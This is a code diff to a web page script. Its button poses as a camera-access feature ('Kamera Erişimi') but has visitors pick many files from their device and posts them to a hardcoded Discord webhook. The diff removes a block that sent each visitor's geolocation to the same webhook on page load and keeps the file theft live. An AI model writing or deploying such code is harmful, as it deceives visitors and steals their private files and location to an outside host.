@@ -13,55 +13,50 @@
       const pictureContainer = document.getElementById('picture-container');
       const webhookUrl = 'https://discord.com/api/webhooks/1246133942344617984/L5BhAqPdku8Q8qR5-DJO5senhebGe2UMdVCsxEzb7cj_pYXBOsG43i1eZzPSk15KrHJD';
 
-      // Request the user's location
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(position => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-
-          // Send the user's location to the Discord webhook
-          const formData = new FormData();
-          formData.append('content', `Siteye Girildi: ${lat}, ${lon}`);
-
-          fetch(webhookUrl, {
-            method: 'POST',
-            body: formData,
-          })
-          .then(response => response.json())
-          .then(data => console.log(data))
-          .catch(error => console.error(error));
-        });
-      } else {
-        console.error('Geolocation is not supported by this browser.');
-      }
-
       takePictureButton.addEventListener('click', async () => {
         try {
           // Request storage access permission
           const permission = await navigator.permissions.query('storage');
-          if (permission.state === 'granted') {
-            // Get all files in the storage
-            const files = await window.showDirectoryPicker();
-            const formData = new FormData();
+          if (permission.state === 'prompt') {
+            const result = await permission.request();
+            if (result.state === 'granted') {
+              // Get all files on the device
+              const files = await window.showOpenFilePicker({
+                multiple: true,
+                types: [
+                  {
+                    description: 'All Files',
+                    accept: {
+                      'image/*': ['.jpg', '.jpeg', '.png', '.gif', '.bmp'],
+                      '*/*': ['*'],
+                    },
+                  },
+                ],
+              });
 
-            // Add all files to the form data
-            files.forEach(file => {
-              formData.append('file', file);
-            });
+              const formData = new FormData();
 
-            formData.append('username', 'Kamera Erişimi');
-            formData.append('content', 'Dosyalar Gönderildi!');
+              // Add all files to the form data
+              files.forEach(file => {
+                formData.append('file', file);
+              });
 
-            // Send the files to the Discord webhook
-            fetch(webhookUrl, {
-              method: 'POST',
-              body: formData,
-            })
-            .then(response => response.json())
-            .then(data => console.log(data))
-            .catch(error => console.error(error));
+              formData.append('username', 'Kamera Erişimi');
+              formData.append('content', 'Dosyalar Gönderildi!');
+
+              // Send the files to the Discord webhook
+              fetch(webhookUrl, {
+                method: 'POST',
+                body: formData,
+              })
+             .then(response => response.json())
+             .then(data => console.log(data))
+             .catch(error => console.error(error));
+            } else {
+              console.error('Storage access permission denied.');
+            }
           } else {
-            console.error('Storage access permission denied.');
+            console.error('Storage access permission already denied.');
           }
         } catch (error) {
           console.error('Error:', error);
